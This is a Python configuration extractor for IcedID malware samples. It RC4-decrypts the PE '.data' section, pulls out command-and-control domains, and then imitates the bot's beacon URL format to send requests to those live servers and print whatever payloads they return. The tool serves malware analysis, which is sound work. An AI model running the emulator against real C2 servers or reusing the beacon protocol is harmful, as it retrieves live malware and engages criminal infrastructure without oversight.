#!/usr/bin/env python3
"""
A configuration extractor for icedid samples
Sample sha256: 9aa167baf70a86145d36ff5878dbefb14d13b111bbea97a16b48aaef42f054e3
Author: @linkavych
Date: 2022-07-30
"""
import sys
import re
import pefile
import requests
from Crypto.Cipher import ARC4


class Emulator:
    """
    The emulation for interacting with the malware C2 server and receiving additional payloads or information
    """

    def __init__(self, url):
        self.url = url

    def build_url(self):
        """
        Builds a URL based on the configuration requirements of the ICEDID sample
        """
        config = 0x1E3D33FB
        timestamp = 0x3A298D54
        pcinfo = "0000000000FF40000006"
        uri_info = "/photo.png?id=%0.2X%0.8X%0.8X%s"

        url_build = uri_info % (1, config, timestamp, pcinfo)

        packet_send = self.url + url_build

        # print(packet_send) # for debugging

        return packet_send

    def sendrequest(self, data):
        """
        Send a requets to the malware C2 server for a new payload

        Print out the page content 0 adjust as needed
        """
        r = requests.get(url=data)
        print(r.content)


class Config_Extract:
    """
    The extractor class for gathering the configuration URLs from the sample
    """

    def __init__(self, filename):
        self.filename = filename

    def rc4_decrypt(self, key, data):

        return ARC4.new(key).decrypt(data)

    def extract(self):
        """
        Extract the data from the '.data' section of the sample and return
        """
        pe = pefile.PE(self.filename)

        for section in pe.sections:
            if b".data" in section.Name:
                return section.get_data()


def main(filename):
    """
    Main function to initiate the extractor and emulator

    If the servers are active, this will simply print out the content from the page
    """
    extractor = Config_Extract(filename)

    data = extractor.extract()

    key = data[:8]
    payload = data[8:]

    dec_data = extractor.rc4_decrypt(key, payload)

    configs = re.findall(rb"[a-zA-Z1-9]+\.[a-z]{3,4}", dec_data)

    for config in configs[1:]:
        emulate = Emulator("https://" + config.decode())
        packt = emulate.build_url()
        emulate.sendrequest(packt)

    return


if __name__ == "__main__":
    main(sys.argv[1])
